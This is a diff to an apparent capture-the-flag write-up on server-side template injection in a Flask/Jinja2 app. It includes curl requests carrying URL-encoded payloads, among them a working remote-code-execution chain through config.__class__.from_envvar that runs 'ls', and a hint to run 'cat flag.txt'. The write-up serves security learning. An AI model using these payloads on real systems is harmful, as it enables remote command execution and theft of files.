@@ -29,7 +29,7 @@ $ curl http://159.65.30.65:32674/
 
 ```bash
 
-%7B%7B7%2A7%7D%7D == {{7*7}} URL encoded 
+%7B%7B7%2A7%7D%7D == \{\{7*7\}\} URL encoded 
 
 $ curl http://159.65.30.65:32674/%7B%7B7%2A7%7D%7D
 
@@ -43,6 +43,7 @@ $ curl http://159.65.30.65:32674/%7B%7B7%2A7%7D%7D
 - The next step would be to get a RCE SSTI payload to perform RCE.
 
 ```bash
+# `%7B%7B%20config.__class__.from_envvar.__globals__.import_string%28%22os%22%29.popen%28%22ls%22%29.read%28%29%20%7D%7D` == `{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}` URL Encoded  
 
 $ curl http://159.65.30.65:32674/%7B%7B%20config.__class__.from_envvar.__globals__.import_string%28%22os%22%29.popen%28%22ls%22%29.read%28%29%20%7D%7D
 
@@ -70,7 +71,6 @@ var
 </str>' could not be found</p>%
 ```
 
-- `%7B%7B%20config.__class__.from_envvar.__globals__.import_string%28%22os%22%29.popen%28%22ls%22%29.read%28%29%20%7D%7D` == `{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}` URL Encoded  
 - Based on the SSTI payload, we managed to execute command `ls` and return some information. 
 - Based on the information, we noticed that there is a flag there.
 - Now just change the SSTI payload above into `cat flag.txt` and urlencode it to get the flag. 
